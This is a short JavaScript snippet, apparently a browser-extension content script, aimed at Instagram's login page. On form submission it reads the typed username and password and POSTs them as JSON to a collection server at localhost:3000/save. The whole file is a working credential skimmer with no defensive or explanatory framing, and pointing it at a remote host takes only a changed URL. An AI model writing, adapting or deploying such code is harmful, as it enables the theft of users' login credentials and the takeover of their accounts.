if (window.location.href.includes("instagram.com/accounts/login")) {
    const form = document.querySelector("form");
  
    if (form) {
      form.addEventListener("submit", function () {
        const username = document.querySelector("input[name='username']").value;
        const password = document.querySelector("input[name='password']").value;
  
        fetch("http://localhost:3000/save", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ username, password }),
        })
          .then((response) => response.json())
          .then((data) => console.log("sent:", data))
          .catch((error) => console.error("error:", error));
      });
    }
  }